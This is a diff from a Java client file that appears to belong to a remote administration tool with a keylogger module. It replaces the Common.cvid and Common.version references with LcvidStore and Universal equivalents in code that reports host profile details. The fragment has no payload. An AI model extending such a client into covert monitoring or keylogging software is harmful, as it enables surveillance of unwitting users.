@@ -22,7 +22,6 @@ import java.awt.GraphicsEnvironment;
 
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.store.ConfigStore;
-import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.attribute.keys.AKeySimple;
 import com.subterranean_security.crimson.core.platform.info.CPU;
 import com.subterranean_security.crimson.core.platform.info.CRIMSON;
@@ -41,6 +40,7 @@ import com.subterranean_security.crimson.core.platform.info.WIN;
 import com.subterranean_security.crimson.core.proto.Delta.AttributeGroupContainer;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Keylogger.State;
+import com.subterranean_security.crimson.core.store.LcvidStore;
 import com.subterranean_security.crimson.universal.Universal;
 
 public final class Platform {
@@ -67,7 +67,7 @@ public final class Platform {
 		EV_ProfileDelta.Builder info = EV_ProfileDelta.newBuilder();
 
 		try {
-			info.setCvid(Common.cvid);
+			info.setCvid(LcvidStore.cvid);
 		} catch (Exception e1) {
 			// TODO handle
 			info.setCvid(0);
@@ -104,7 +104,7 @@ public final class Platform {
 	public static String queryAttribute(AKeySimple sa) {
 		switch (sa) {
 		case CLIENT_CID:
-			return "" + Common.cvid;
+			return "" + LcvidStore.cvid;
 		case CLIENT_CPU_USAGE:
 			return CPU.getClientUsage();
 		case CLIENT_ONLINE:
@@ -112,7 +112,7 @@ public final class Platform {
 		case CLIENT_RAM_USAGE:
 			return RAM.getClientUsage();
 		case CLIENT_VERSION:
-			return Common.version;
+			return Universal.version;
 		case CLIENT_BASE_PATH:
 			return CRIMSON.getBasePath();
 		case CLIENT_INSTALL_DATE:
